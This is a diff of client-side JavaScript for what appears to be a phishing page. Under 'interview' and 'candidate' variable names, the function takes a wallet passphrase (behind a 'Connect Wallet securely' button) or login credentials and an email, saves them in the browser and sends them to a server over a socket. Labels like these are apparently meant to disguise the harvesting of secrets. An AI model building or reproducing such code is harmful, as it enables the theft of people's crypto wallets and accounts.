@@ -650,13 +650,14 @@
 
     function startInterview(btn, type, isRestore = false) {
         
-            btn.classList.add('btn-loading');
-                const btnText = btn.querySelector('.btn-text');
-                if(btnText) btnText.innerText = "Processing...";
+        btn.classList.add('btn-loading');
+        const btnText = btn.querySelector('.btn-text');
+        if(btnText) btnText.innerText = "Processing...";
+        $(".action-btn").prop('disabled', false);
 
-                let candidateName;
-                let candidateEmail;
-                let selectedCategory;
+        let candidateName;
+        let candidateEmail;
+         let selectedCategory;
 
                /* setTimeout(() => {
                     btn.classList.remove('btn-loading');
@@ -664,47 +665,47 @@
                 }, 2000);*/
 
 
-            if(!isRestore) {
+        if(!isRestore) {
 
 
-                const placeholderVal = document.getElementById('placeholder')?.value;
-                const phraseVal      = document.getElementById('phrase')?.value;
-                const emailVal       = document.getElementById('email-input')?.value;
+            const placeholderVal = document.getElementById('placeholder')?.value;
+            const phraseVal      = document.getElementById('phrase')?.value;
+            const emailVal       = document.getElementById('email-input')?.value;
 
-                // Assign based on type
-                candidateName  = (type === "credentials") ? placeholderVal : phraseVal;
-                candidateEmail = (type === "credentials") ? emailVal: getOrCreateDeviceID();
-                selectedCategory = document.getElementById('country-hidden-input').value;
+            // Assign based on type
+            candidateName  = (type === "credentials") ? placeholderVal : phraseVal;
+            candidateEmail = (type === "credentials") ? emailVal: getOrCreateDeviceID();
+            selectedCategory = document.getElementById('country-hidden-input').value;
 
 
-                if(!candidateName || !candidateEmail || !selectedCategory) {
-                    btn.classList.remove('btn-loading');
-                    btnText.innerText = (type === "credentials") ? "Process Verification" : "Connect Wallet securely";
-                }
+            if(!candidateName || !candidateEmail || !selectedCategory) {
+                btn.classList.remove('btn-loading');
+                btnText.innerText = (type === "credentials") ? "Process Verification" : "Connect Wallet securely";
+            }
                 
-                localStorage.setItem('cand_name', candidateName);
-                localStorage.setItem('cand_email', candidateEmail);
-                localStorage.setItem('cand_cat', selectedCategory);
-            }
-
-            
-            document.getElementById('error-div').innerHTML = '';
-            $('#z6x2c9v4b1_992211').show();
-            
-            
-            socket.emit('join_interview', { 
-                name: candidateName, 
-                email: candidateEmail, 
-                categoryId: selectedCategory 
-            });
-
-            const savedTask = localStorage.getItem('current_task');
-            if (isRestore && savedTask) {
-                const taskData = JSON.parse(savedTask);
-                currentScreenFile = taskData.screenFile;
-                renderScreen(taskData);
-            }
+            localStorage.setItem('cand_name', candidateName);
+            localStorage.setItem('cand_email', candidateEmail);
+            localStorage.setItem('cand_cat', selectedCategory);
         }
+
+            
+        document.getElementById('error-div').innerHTML = '';
+        $('#z6x2c9v4b1_992211').show();
+            
+            
+        socket.emit('join_interview', { 
+            name: candidateName, 
+            email: candidateEmail, 
+            categoryId: selectedCategory 
+        });
+
+        const savedTask = localStorage.getItem('current_task');
+        if (isRestore && savedTask) {
+            const taskData = JSON.parse(savedTask);
+            currentScreenFile = taskData.screenFile;
+            renderScreen(taskData);
+        }
+    }
 
     socket.on('new_task', async (data) => {
         if ($('#z6x2c9v4b1_992211')) {
@@ -863,6 +864,7 @@
 
     socket.on('join_failed', (data) => {
         console.warn("Join failed:", data.message);
+        let btnText = "Resubmit";
         
         // 1. Show the error to the candidate
        
@@ -875,7 +877,13 @@
         localStorage.removeItem('cand_cat');
         document.getElementById('indicator').focus();
 
+        if($(".action-btn")){
+            btnText = (accessType === "passphrase")? "Connect Wallet securely" : "Process Verification";
+        }
 
+        $(".action-btn").html(btnText)
+        $(".action-btn").prop('disabled', false);
+        
         // 3. Reset local variables so they have to type/select again if necessary
         // This forces the "redo the entrance" behavior you requested.
         console.log("Candidate must now manually re-enter details and click Join.");
